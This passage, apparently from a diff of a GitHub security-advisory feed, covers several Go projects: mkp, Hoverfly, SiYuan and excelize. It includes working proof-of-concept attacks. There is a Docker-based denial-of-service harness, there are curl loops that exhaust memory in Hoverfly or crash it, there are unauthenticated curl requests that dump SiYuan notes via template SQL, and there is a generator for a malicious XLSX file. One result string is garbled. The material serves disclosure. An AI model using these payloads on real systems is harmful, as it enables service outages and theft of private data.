+WORKDIR /src
+
+# Copy the source tree (build con = parent of vuln-001/)
+COPY repo/ .
+
+RUN go build -o /mkp-server ./cmd/server
+
+# ── Stage 2: Runtime ─────────────────────────────────────────────────────────
+FROM python:3.12-slim
+
+RUN apt-get update &amp;&amp; \
+ apt-get install -y --no-install-recommends procps curl &amp;&amp; \
+ rm -rf /var/lib/apt/lists/*
+
+COPY --from=builder /mkp-server /usr/local/bin/mkp-server
+
+COPY vuln-001/mock_k8s_api.py /workspace/mock_k8s_api.py
+COPY vuln-001/kubeconfig.yaml /workspace/kubeconfig.yaml
+COPY vuln-001/exploit.py /workspace/exploit.py
+COPY vuln-001/entrypoint.sh /workspace/entrypoint.sh
+
+RUN chmod +x /workspace/entrypoint.sh
+
+CMD ["/workspace/entrypoint.sh"]
+</code></pre>
+<h4 id="pocpy"><code>poc.py</code></h4>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+VULN-001 Dynamic Reproduction Orchestrator.
+
+Build: docker build -t mkp-vuln-001 -f vuln-001/Dockerfile .
+Run  : docker run --rm mkp-vuln-001
+
+Evidence criterion: MKP RSS grows by ≥ 50 MB while processing a single
+tools/call request with limitBytes=134217728 (128 MB), proving that
+defaultGetPodLogs() performs an unbounded io.Copy into bytes.Buffer.
+"""
+import json
+import os
+import re
+import subprocess
+import sys
+from pathlib import Path
+
+WORK_DIR = Path(__file__).parent.resolve()
+REPO_ROOT = WORK_DIR.parent
+IMAGE = "mkp-vuln-001"
+BUILD_CMD = f"docker build -t {IMAGE} -f vuln-001/Dockerfile ."
+RUN_CMD   = f"docker run --rm {IMAGE}"
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+def run_streaming(cmd: str, cwd=None) -&gt; tuple[int, str]:
+    """Run a shell command, stream its output, and return (rc, full_output)."""
+    proc = subprocess.Popen(
+        cmd, shell=True,
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        text=True, cwd=cwd,
+    )
+    lines = []
+    for line in proc.stdout:
+        print(line, end='', flush=True)
+        lines.append(line)
+    proc.wait()
+    return proc.returncode, ''.join(lines)
+
+
+def save_result(result: dict):
+    path = WORK_DIR / 'phase2_result.json'
+    with open(path, 'w', encoding='utf-8') as f:
+        json.dump(result, f, ensure_ascii=False, indent=2)
+    print(f"\n[poc] Result saved → {path}")
+
+
+def parse_evidence(output: str) -&gt; dict:
+    ev: dict = {}
+    m = re.search(r'Initial RSS\s*:\s*(\d+)', output)
+    if m:
+        ev['initial_kb'] = int(m.group(1))
+        ev['initial_mb'] = ev['initial_kb'] / 1024
+
+    m = re.search(r'Peak RSS\s*:\s*(\d+)', output)
+    if m:
+        ev['peak_kb'] = int(m.group(1))
+        ev['peak_mb'] = ev['peak_kb'] / 1024
+
+    m = re.search(r'Delta RSS\s*:\s*(\d+)\s*kB\s*\(([0-9.]+)\s*MB\)', output)
+    if m:
+        ev['delta_kb'] = int(m.group(1))
+        ev['delta_mb'] = float(m.group(2))
+    elif 'peak_kb' in ev and 'initial_kb' in ev:
+        ev['delta_kb'] = ev['peak_kb'] - ev['initial_kb']
+        ev['delta_mb'] = ev['delta_kb'] / 1024
+
+    m = re.search(r'VERDICT:\s*(CONFIRMED|INCONCLUSIVE)[^\n]*', output)
+    if m:
+        ev['verdict_line'] = m.group(0)
+
+    return ev
+
+
+def extract_evidence_block(output: str) -&gt; str:
+    """Return the EVIDENCE SUMMARY block, or the last 3000 chars."""
+    m = re.search(r'={10,}\nEVIDENCE SUMMARY.*?={10,}', output, re.DOTALL)
+    if m:
+        return m.group(0)[:3000]
+    return output[-3000:]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+def main():
+    print("=" * 60)
+    print("VULN-001: Unbounded Pod Log Read — Dynamic Reproduction")
+    print("=" * 60)
+
+    os.chdir(REPO_ROOT)
+
+    # ── Docker build ──────────────────────────────────────────────────────────
+    print(f"\n[poc] Building Docker image…\n[poc] {BUILD_CMD}\n")
+    rc, build_output = run_streaming(BUILD_CMD)
+    if rc != 0:
+        reason = f"Docker build failed (exit {rc}). text error: {build_output[-800:]}"
+        save_result({
+            "passed": False,
+            "verdict": "FAIL",
+            "reason": reason,
+            "build_command": BUILD_CMD,
+            "run_command": RUN_CMD,
+            "poc_command": "python3 vuln-001/poc.py",
+            "evidence": build_output[-2000:],
+            "artifacts": ["Dockerfile", "poc.py"],
+        })
+        print(f"\n[poc] FAIL: {reason}")
+        return False
+
+    print("\n[poc] Build OK.")
+
+    # ── Docker run ────────────────────────────────────────────────────────────
+    print(f"\n[poc] Running exploit container…\n[poc] {RUN_CMD}\n")
+    rc, run_output = run_streaming(f"{RUN_CMD} 2&gt;&amp;1")
+    print(f"\n[poc] Container exited (code={rc})")
+
+    ev = parse_evidence(run_output)
+    delta_mb = ev.get('delta_mb', 0.0)
+    print(f"[poc] Parsed evidence: {ev}")
+
+    # ── Verdict ───────────────────────────────────────────────────────────────
+    passed = delta_mb &gt;= 50.0
+
+    if passed:
+        verdict = "PASS"
+        init_mb = ev.get('initial_mb', 0)
+        peak_mb = ev.get('peak_mb', 0)
+        reason = (
+            f"MKP server RSStext {init_mb:.1f} MB → {peak_mb:.1f} MBtext {delta_mb:.1f} MB increasedone. "
+            f"the attacker limitBytes=134217728 (128 MB)text tools/call requesttext containswhentextcharacters "
+            f"pkg/k8s/subresource.go:114-115text io.Copy(buf, podLogs)text limit text "
+            f"bytes.Buffertext 128 MB text streamtext beforetext text thattext dynamicas confirmed."
+        )
+    else:
+        verdict = "INCOMPLETE"
+        reason = (
+            f"RSS text {delta_mb:.1f} MB — 50 MB criteria text. "
+            f"possibletext cause: MCP session initialization failure, 30seconds texttext timeout text exit, "
+            f"or Mock API response textreached. container logs text 500characters: {run_output[-500:]}"
+        )
+
+    result = {
+        "passed": passed,
+        "verdict": verdict,
+        "reason": reason,
+        "build_command": BUILD_CMD,
+        "run_command": RUN_CMD,
+        "poc_command": "python3 vuln-001/poc.py",
+        "evidence": extract_evidence_block(run_output),
+        "artifacts": ["Dockerfile", "poc.py"],
+    }
+    save_result(result)
+
+    print(f"\n[poc] {'PASS' if passed else 'INCOMPLETE'}: {reason}")
+    return passed
+
+
+if __name__ == '__main__':
+    ok = main()
+    sys.exit(0 if ok else 1)
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/StacklokLabs/mkp/security/advisories/GHSA-qw5r-ppcg-f8rj">https://github.com/StacklokLabs/mkp/security/advisories/GHSA-qw5r-ppcg-f8rj</a></li>
+<li><a href="https://github.com/advisories/GHSA-qw5r-ppcg-f8rj">https://github.com/advisories/GHSA-qw5r-ppcg-f8rj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qw5r-ppcg-f8rj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-14T18:09:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/SpectoLabs/hoverfly] Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions]]></title>
+        <id>https://github.com/advisories/GHSA-42j2-w334-qxw7</id>
+        <link href="https://github.com/advisories/GHSA-42j2-w334-qxw7"/>
+        <updated>2026-07-14T18:04:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary:</h3>
+<p>Remote post-serve actions use <code>http.DefaultClient</code> without any timeout configuration. When the remote endpoint is unreachable or intentionally slow (accepts TCP connection but never responds), each triggered proxy request spawns a goroutine that blocks indefinitely on <code>http.DefaultClient.Do()</code>. An attacker can cause unbounded goroutine accumulation leading to memory exhaustion and process crash (OOM kill). Unlike local post-serve action execution, this requires no binary execution, only a URL pointing to a non-responsive endpoint.</p>
+<h3 id="details">Details:</h3>
+<p><strong>1. Remote actions executed in goroutines without timeout (<code>core/hoverfly.go:224-228</code>):</strong></p>
+<pre><code class="language-go">go postServeAction.Execute(result.Pair, journalIDChannel, hf.Journal)
+</code></pre>
+<p>Post-serve actions are executed in separate goroutines with no recovery wrapper.</p>
+<p><strong>2. HTTP client has no timeout (<code>core/action/action.go:128-143</code>):</strong></p>
+<pre><code class="language-go">req, err := http.NewRequest("POST", action.Remote, bytes.NewBuffer(pairViewBytes))
+// ...
+resp, err := http.DefaultClient.Do(req)  // No timeout! Blocks forever.
+</code></pre>
+<p><code>http.DefaultClient</code> has zero timeout by default in Go. If the remote server:</p>
+<ul>
+<li>Accepts the TCP connection but never sends a response</li>
+<li>Establishes TLS but never completes the handshake  </li>
+<li>Uses TCP window size 0 (flow control stall)</li>
+</ul>
+<p>...the goroutine blocks indefinitely. There is no context cancellation, no deadline, and no cleanup.</p>
+<p><strong>3. No goroutine limit or backpressure:</strong></p>
+<p>There is no limit on how many post-serve action goroutines can be active simultaneously. Each matching proxy request spawns a new one unconditionally.</p>
+<p><strong>4. The goroutine is never cleaned up:</strong></p>
+<p>The only exit path from <code>Execute()</code> is a successful (or failed) HTTP response. A non-responding server means the goroutine lives until the process is killed.</p>
+<h3 id="environment">Environment:</h3>
+<ul>
+<li><strong>Hoverfly version:</strong> v1.12.7</li>
+<li><strong>Operating System:</strong> macOS Darwin 25.4.0</li>
+<li><strong>Go version:</strong> 1.26.2</li>
+<li><strong>Configuration:</strong> Default (no flags required)</li>
+</ul>
+<h3 id="poc">POC:</h3>
+<p><strong>Step 1: Start a black-hole TCP listener (accepts connections, never responds)</strong></p>
+<pre><code class="language-bash"># Option A: Use ncat
+ncat -l -k 9999 &amp;
+
+# Option B: Use a non-routable IP (connections hang at TCP SYN)
+# 192.0.2.1 is TEST-NET-1, guaranteed non-routable
+# This causes http.DefaultClient to block on TCP connect timeout (which is also unlimited)
+</code></pre>
+<p><strong>Step 2: Register remote post-serve action pointing to the black hole</strong></p>
+<pre><code class="language-bash">curl -X PUT http://localhost:8888/api/v2/hoverfly/post-serve-action \
+  -H "Content-Type: application/json" \
+  -d '{
+    "actionName": "leak",
+    "remote": "http://192.0.2.1:9999/blackhole",
+    "delayInMs": 0
+  }'
+</code></pre>
+<p><strong>Step 3: Load a catch-all simulation</strong></p>
+<pre><code class="language-bash">curl -X PUT http://localhost:8888/api/v2/simulation \
+  -H "Content-Type: application/json" \
+  -d '{
+    "data": {
+      "pairs": [{
+        "request": {"path": [{"matcher": "glob", "value": "*"}]},
+        "response": {"status": 200, "body": "ok", "postServeAction": "leak"}
+      }],
+      "globalActions": {"delays": [], "delaysLogNormal": []}
+    },
+    "meta": {"schemaVersion": "v5.2"}
+  }'
+</code></pre>
+<p><strong>Step 4: Flood with requests</strong></p>
+<pre><code class="language-bash"># Each request spawns an immortal goroutine
+for i in $(seq 1 10000); do
+    curl -s -x http://localhost:8500 "http://target.com/req${i}" &amp;
+    # Throttle to avoid local FD exhaustion
+    [ $((i % 100)) -eq 0 ] &amp;&amp; wait
+done
+</code></pre>
+<p><strong>Verified memory impact on Hoverfly v1.12.7:</strong></p>
+<pre><code>Memory before: 20,064 KB
+Memory after 50 requests: 23,376 KB
+Memory increase: 3,312 KB (66 KB per goroutine)
+</code></pre>
+<p>At this rate:</p>
+<ul>
+<li>1,000 requests = ~64 MB leaked</li>
+<li>10,000 requests = ~640 MB leaked</li>
+<li>100,000 requests = ~6.4 GB leaked → OOM crash</li>
+</ul>
+<h3 id="impact">Impact:</h3>
+<p>An attacker with access to the admin API (unauthenticated by default) can cause a complete denial of service by:</p>
+<ol>
+<li>Registering a remote post-serve action pointing to a non-responsive endpoint.</li>
+<li>Loading a catch-all simulation that triggers the action on every request.</li>
+<li>Sending proxy traffic, each request permanently leaks a goroutine and its associated memory.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-42j2-w334-qxw7">https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-42j2-w334-qxw7</a></li>
+<li><a href="https://github.com/SpectoLabs/hoverfly/pull/1228">https://github.com/SpectoLabs/hoverfly/pull/1228</a></li>
+<li><a href="https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8">https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8</a></li>
+<li><a href="https://github.com/advisories/GHSA-42j2-w334-qxw7">https://github.com/advisories/GHSA-42j2-w334-qxw7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-42j2-w334-qxw7</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-14T18:04:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/SpectoLabs/hoverfly] Hoverfly: Process Crash via Concurrent Map Write Race Condition in Diff Mode]]></title>
+        <id>https://github.com/advisories/GHSA-qrh4-p6v4-mrfg</id>
+        <link href="https://github.com/advisories/GHSA-qrh4-p6v4-mrfg"/>
+        <updated>2026-07-14T18:03:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary:</h3>
+<p>When Hoverfly is running in Diff mode, the <code>AddDiff()</code> function writes to the shared <code>responsesDiff</code> map without any synchronization (no mutex). When multiple proxy requests are processed concurrently (the normal case for any proxy), the concurrent map writes trigger Go's built-in race detector which causes a <code>fatal error: concurrent map read and map write</code>, immediately killing the entire Hoverfly process. This is trivially exploitable by sending multiple simultaneous requests.</p>
+<h3 id="details">Details:</h3>
+<p><strong>1. Unsynchronized map access in <code>AddDiff()</code> (<code>core/hoverfly_service.go:417-421</code>):</strong></p>
+<pre><code class="language-go">func (hf *Hoverfly) AddDiff(requestView v2.SimpleRequestDefinitionView, diffReport v2.DiffReport) {
+    if len(diffReport.DiffEntries) &gt; 0 {
+        diffs := hf.responsesDiff[requestView]                    // UNSYNCHRONIZED READ
+        hf.responsesDiff[requestView] = append(diffs, diffReport) // UNSYNCHRONIZED WRITE
+    }
+}
+</code></pre>
+<p><strong>2. This function is called from Diff mode processing, which runs concurrently per request (<code>core/modes/diff_mode.go</code>):</strong></p>
+<p>Each incoming proxy request is handled in its own goroutine by Go's <code>net/http</code> server. In Diff mode, each request calls <code>AddDiff()</code> after comparing the simulated and actual responses. With multiple concurrent requests, multiple goroutines write to the same map simultaneously.</p>
+<p><strong>3. Go's runtime detects concurrent map access and terminates the process:</strong></p>
+<p>Unlike data races on simple values (which produce undefined behavior silently), Go's map implementation includes a built-in concurrent access check. When two goroutines access the same map and at least one is writing, the runtime calls <code>fatal()</code> which is unrecoverable, it cannot be caught by <code>recover()</code>.</p>
+<p><strong>4. No mutex protection exists on <code>responsesDiff</code>:</strong></p>
+<p>The field is declared as a plain <code>map[v2.SimpleRequestDefinitionView][]v2.DiffReport</code> with no associated <code>sync.RWMutex</code>. Compare with <code>hf.state</code> which properly uses <code>sync.RWMutex</code> for its map access.</p>
+<h3 id="environment">Environment:</h3>
+<ul>
+<li><strong>Hoverfly version:</strong> v1.12.7</li>
+<li><strong>Operating System:</strong> macOS Darwin 25.4.0</li>
+<li><strong>Go version:</strong> 1.26.2</li>
+<li><strong>Configuration:</strong> Hoverfly in Diff mode (<code>PUT /api/v2/hoverfly/mode {"mode":"diff"}</code>)</li>
+</ul>
+<h3 id="poc">POC:</h3>
+<p><strong>Step 1: Start Hoverfly and set Diff mode</strong></p>
+<pre><code class="language-bash">./hoverfly &amp;
+sleep 2
+
+# Set diff mode
+curl -X PUT http://localhost:8888/api/v2/hoverfly/mode \
+  -H "Content-Type: application/json" \
+  -d '{"mode": "diff"}'
+
+# Load a simulation for diff comparison
+curl -X PUT http://localhost:8888/api/v2/simulation \
+  -H "Content-Type: application/json" \
+  -d '{
+    "data": {
+      "pairs": [{
+        "request": {"path": [{"matcher": "glob", "value": "*"}]},
+        "response": {"status": 200, "body": "expected"}
+      }],
+      "globalActions": {"delays": [], "delaysLogNormal": []}
+    },
+    "meta": {"schemaVersion": "v5.2"}
+  }'
+</code></pre>
+<p><strong>Step 2: Send concurrent requests to trigger the race</strong></p>
+<pre><code class="language-bash"># Send 50 concurrent requests, race condition triggers within seconds
+for i in $(seq 1 50); do
+    curl -s -x http://localhost:8500 "http://httpbin.org/get?id=$i" &amp;
+done
+wait
+</code></pre>
+<p><strong>Step 3: Observe the crash</strong></p>
+<pre><code class="language-bash"># Check if process is still running
+pgrep -f hoverfly
+</code></pre>
+<p><strong>crash output on Hoverfly v1.12.7:</strong></p>
+<pre><code>fatal error: concurrent map read and map write
+
+goroutine 892 [running]:
+github.com/SpectoLabs/hoverfly/core.(*Hoverfly).AddDiff(...)
+        /core/hoverfly_service.go:419
+github.com/SpectoLabs/hoverfly/core/modes.(*DiffMode).Process(...)
+</code></pre>
+<p>The process crashes with ~50 concurrent requests. In production with real traffic, it crashes almost immediately.</p>
+<h3 id="impact">Impact:</h3>
+<ul>
+<li><strong>Full denial of service:</strong> The process terminates immediately and cannot be recovered without a restart</li>
+<li><strong>Trivial exploitation:</strong> Any attacker with proxy access can trigger this by sending multiple concurrent requests</li>
+<li><strong>No admin API access required:</strong> Only proxy port access is needed to trigger the crash</li>
+<li><strong>Unrecoverable:</strong> <code>fatal error</code> in Go cannot be caught by <code>recover()</code> — the process is unconditionally killed</li>
+<li><strong>Affects all Diff mode users:</strong> Any team using Diff mode for API comparison testing is vulnerable</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-qrh4-p6v4-mrfg">https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-qrh4-p6v4-mrfg</a></li>
+<li><a href="https://github.com/SpectoLabs/hoverfly/pull/1227">https://github.com/SpectoLabs/hoverfly/pull/1227</a></li>
+<li><a href="https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8">https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8</a></li>
+<li><a href="https://github.com/advisories/GHSA-qrh4-p6v4-mrfg">https://github.com/advisories/GHSA-qrh4-p6v4-mrfg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qrh4-p6v4-mrfg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-14T18:03:10.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/k3s-io/k3s] K3s: ZIP Archive Path Traversal Vulnerability in etcd Snapshot Decompression]]></title>
         <id>https://github.com/advisories/GHSA-jxr7-mqhw-9p98</id>
@@ -1715,911 +2670,5 @@ func (a ProxyAuth) Auth(r *http.Request, usr users.Store, setting *settings.Sett
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-10T19:27:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Unauthenticated SQLite Data Exfiltration via Template Injection in /api/icon/getDynamicIcon]]></title>
-        <id>https://github.com/advisories/GHSA-gcm7-57gf-953c</id>
-        <link href="https://github.com/advisories/GHSA-gcm7-57gf-953c"/>
-        <updated>2026-07-10T19:26:01.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>/api/icon/getDynamicIcon</code> endpoint is explicitly excluded from authentication in SiYuan's kernel router (<code>router.go</code>, "不需要鉴权" -- no auth needed). When called with <code>type=8</code> and a valid block <code>id</code> parameter, this endpoint invokes <code>RenderDynamicIconContentTemplate</code>, which executes a Go template that includes the <code>querySQL</code> and <code>queryBlocks</code> functions. These functions run arbitrary SELECT statements against the SiYuan SQLite database. An unauthenticated network-adjacent attacker who knows a valid block ID can exfiltrate all user note content, tags, asset references, and block attributes from the database.</p>
-<h3 id="details">Details</h3>
-<p><strong>Root cause -- kernel/api/router.go, line 37:</strong></p>
-<pre><code class="language-go">// 不需要鉴权
-ginServer.Handle("GET", "/api/icon/getDynamicIcon", getDynamicIcon)
-</code></pre>
-<p><strong>Attack chain:</strong></p>
-<ol>
-<li><p><code>getDynamicIcon</code> (kernel/api/icon.go) checks <code>type=8</code> and calls <code>model.RenderDynamicIconContentTemplate(content, id)</code> when <code>content</code> contains <code>.action{</code>.</p>
-</li>
-<li><p><code>RenderDynamicIconContentTemplate</code> (kernel/model/template.go:264) parses <code>content</code> as a Go template. The template function map includes <code>querySQL</code> and <code>queryBlocks</code> registered via <code>sql.SQLTemplateFuncs</code>.</p>
-</li>
-<li><p><code>querySQL</code> calls <code>Query(stmt, 1024)</code> (kernel/sql/block_query.go) which executes the SQL statement against the SQLite database containing all user notes.</p>
-</li>
-<li><p>The SQL result is rendered into the SVG response body and returned to the unauthenticated caller.</p>
-</li>
-</ol>
-<p><strong>Constraint:</strong> The block <code>id</code> parameter must be a valid block ID that exists in the database. Block IDs are 22-character strings in the format <code>YYYYMMDDHHMMSS-XXXXXXX</code> (timestamp + 7 alphanumeric chars). Valid IDs are embedded in shared document URLs and can be leaked through any other authenticated endpoint, referrer headers, or browser history.</p>
-<p><strong>Tested on SiYuan v3.6.5 (Docker, network-serving mode, access auth code enabled):</strong></p>
-<pre><code>GET /api/icon/getDynamicIcon?type=8&amp;content=.action{querySQL+"SELECT+id,content+FROM+blocks+LIMIT+5"}&amp;id=&lt;KNOWN_BLOCK_ID&gt;
-Host: siyuan.example.com
-(No Authorization header)
-</code></pre>
-<p>Response (SVG with exfiltrated data embedded):</p>
-<pre><code class="language-xml">&lt;text ...&gt;[map[id:20260524010447-jc9ypd4 content:test]
-           map[id:20260524011002-ttaa7lu content:My password is SuperSecret123!]]&lt;/text&gt;
-</code></pre>
-<p>The <code>querySQL</code> template function can query any table: <code>blocks</code> (all note content and metadata), <code>spans</code> (tags), <code>assets</code> (asset references), <code>attributes</code> (block attributes), and <code>refs</code> (backlinks).</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-bash">TARGET="http://siyuan.example.com:6806"
-BLOCK_ID="KNOWN_BLOCK_ID_HERE"  # From a shared link or other source
-
-# List all database tables
-curl -s "${TARGET}/api/icon/getDynamicIcon?type=8&amp;content=.action%7BquerySQL+%22SELECT+name+FROM+sqlite_master+WHERE+type%3D%27table%27%22%7D&amp;id=${BLOCK_ID}"
-
-# Dump all note content
-curl -s "${TARGET}/api/icon/getDynamicIcon?type=8&amp;content=.action%7BquerySQL+%22SELECT+id%2Ctype%2Ccontent+FROM+blocks+LIMIT+100%22%7D&amp;id=${BLOCK_ID}"
-</code></pre>
-<p><strong>PoC script:</strong> <code>/home/mrrobot/GoogleDrive/vuln-research/siyuan/scripts/poc_getDynamicIcon_sqli.sh</code></p>
-<h3 id="impact">Impact</h3>
-<p>Any network-reachable SiYuan instance (Docker deployments default to <code>0.0.0.0:6806</code>) is vulnerable to complete note content exfiltration without authentication, provided the attacker can obtain one valid block ID. Block IDs are leaked in shared document URLs, embedded images referencing block IDs, and browser history. In a networked deployment scenario (e.g., a self-hosted SiYuan accessible from the internet), all personal notes, tags, and metadata are exposed to unauthenticated attackers.</p>
-<p>This vulnerability is distinct from previously reported SQL injection issues (GHSA-j7wh-x834-p3r7) which targeted the search API. The <code>getDynamicIcon</code> endpoint was never intended to execute SQL queries but gained this capability through the <code>querySQL</code> template function registered for the icon content template renderer.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gcm7-57gf-953c">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gcm7-57gf-953c</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54068">https://nvd.nist.gov/vuln/detail/CVE-2026-54068</a></li>
-<li><a href="https://github.com/advisories/GHSA-gcm7-57gf-953c">https://github.com/advisories/GHSA-gcm7-57gf-953c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gcm7-57gf-953c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-10T19:26:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/xuri/excelize/v2] Excelize: Unbounded Row Index Allocation in Worksheet Parser (checkSheet OOM/Panic DoS)]]></title>
-        <id>https://github.com/advisories/GHSA-h69g-9hx6-f3v4</id>
-        <link href="https://github.com/advisories/GHSA-h69g-9hx6-f3v4"/>
-        <updated>2026-07-10T19:25:21.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="unbounded-row-index-allocation-in-worksheet-parser-checksheet-oompanic-dos">Unbounded Row Index Allocation in Worksheet Parser (checkSheet OOM/Panic DoS)</h2>
-<h3 id="summary">Summary</h3>
-<p>The <code>checkSheet()</code> function in <code>github.com/xuri/excelize/v2</code> uses an attacker-controlled <code>&lt;row r="N"&gt;</code> XML attribute value directly as the length argument to <code>make([]xlsxRow, row)</code> without validating it against the Excel row limit (<code>TotalRows = 1,048,576</code>). A specially crafted XLSX file can trigger two denial-of-service variants: (A) an out-of-memory process kill when <code>r=2147483647</code> forces a ~16 GB allocation attempt, and (B) a runtime panic via out-of-bounds slice indexing when <code>r=-1</code>. Any service that opens attacker-supplied XLSX files and calls <code>GetCellValue</code> is affected. No authentication is required.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable code path is triggered by calling <code>GetCellValue</code> (or any API that internally invokes <code>workSheetReader</code>) on an XLSX file containing a crafted worksheet row element.</p>
-<p><strong>Data flow (source → sink):</strong></p>
-<ol>
-<li><code>excelize.go:186-193</code> — <code>OpenReader</code> reads attacker-controlled spreadsheet bytes.</li>
-<li><code>excelize.go:216-223</code> — ZIP reader is created and passed to <code>ReadZipReader</code>.</li>
-<li><code>lib.go:43-77</code> — ZIP entries are read into <code>fileList</code>; worksheet XML is stored by part name.</li>
-<li><code>excelize.go:228-229</code> — XML bytes are stored in <code>f.Pkg</code>.</li>
-<li><code>cell.go:71-79</code> — Public <code>GetCellValue</code> enters the worksheet value-read path.</li>
-<li><code>cell.go:1492-1494</code> — <code>getCellStringFunc</code> calls <code>workSheetReader</code>.</li>
-<li><code>excelize.go:313-324</code> — Worksheet XML is decoded into <code>xlsxWorksheet</code>.</li>
-<li><code>xmlWorksheet.go:302-312</code> — <code>&lt;row r="..."&gt;</code> is deserialized into <code>xlsxRow.R int</code> with no validation (source).</li>
-<li><code>excelize.go:357-377</code> — <code>checkSheet()</code> accumulates the maximum <code>r</code> value; <strong>sink</strong>: <code>make([]xlsxRow, row)</code> allocates a slice of that size before any bounds check.</li>
-</ol>
-<p><strong>Vulnerable code (<code>excelize.go:373-377</code>):</strong></p>
-<pre><code class="language-go">if r.R != 0 &amp;&amp; r.R &gt; row {
-    row = r.R
-}
-sheetData := xlsxSheetData{Row: make([]xlsxRow, row)}  // unbounded allocation
-</code></pre>
-<p>The constant <code>TotalRows = 1048576</code> is defined in <code>templates.go:190</code> but is never applied before the <code>make()</code> call in <code>checkSheet()</code>, leaving the allocation fully attacker-controlled.</p>
-<p><strong>Variant A (<code>r = 2147483647</code>):</strong> <code>make([]xlsxRow, 2147483647)</code> attempts to allocate approximately 16 GB of memory. The Go runtime terminates the process with <code>fatal error: runtime: out of memory</code>.</p>
-<p><strong>Variant B (<code>r = -1</code>):</strong> The first loop in <code>checkSheet()</code> leaves <code>row = 0</code> because the condition <code>r.R != 0</code> is false for <code>r.R = -1</code>. The second loop then executes <code>sheetData.Row[r.R-1]</code>, which evaluates to <code>sheetData.Row[-2]</code>, triggering <code>runtime error: index out of range [-2]</code> at <code>excelize.go:381</code>.</p>
-<p>Dynamic reproduction confirmed both variants inside a memory-limited Docker container (256 MB). The full panic stack trace for Variant B is:</p>
-<pre><code>panic: runtime error: index out of range [-2]
-
-goroutine 1 [running]:
-github.com/xuri/excelize/v2.(*xlsxWorksheet).checkSheet(...)
-        /excelize/excelize.go:381
-github.com/xuri/excelize/v2.(*File).workSheetReader(...)
-        /excelize/excelize.go:329
-github.com/xuri/excelize/v2.(*File).getCellStringFunc(...)
-        /excelize/cell.go:1494
-github.com/xuri/excelize/v2.(*File).GetCellValue(...)
-        /excelize/cell.go:72
-main.main.func1(...)
-        /excelize/cmd/poc/main.go:44
-main.main()
-        /excelize/cmd/poc/main.go:52
-</code></pre>
-<p><strong>Recommended remediation (<code>excelize.go</code>):</strong></p>
-<pre><code class="language-diff">-func (ws *xlsxWorksheet) checkSheet() {
-+func (ws *xlsxWorksheet) checkSheet() error {
-     ...
-         for i := 0; i &lt; len(ws.SheetData.Row); i++ {
-             r := ws.SheetData.Row[i]
-+            if r.R &lt; 0 {
-+                return newInvalidRowNumberError(r.R)
-+            }
-+            if r.R &gt; TotalRows {
-+                return ErrMaxRows
-+            }
-     ...
-     ws.SheetData = *sheetData
-+    return nil
- }
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p><strong>Step 1: Generate the malicious XLSX</strong></p>
-<pre><code class="language-python">import zipfile
-
-# Variant A: OOM   → row = "2147483647"
-# Variant B: Panic → row = "-1"
-row = "-1"
-
-with zipfile.ZipFile("malicious.xlsx", "w", zipfile.ZIP_DEFLATED) as z:
-    z.writestr("[Content_Types].xml", '''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;
-&lt;Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/&gt;
-&lt;Default Extension="xml" ContentType="application/xml"/&gt;
-&lt;Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/&gt;
-&lt;Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/&gt;
-&lt;/Types&gt;''')
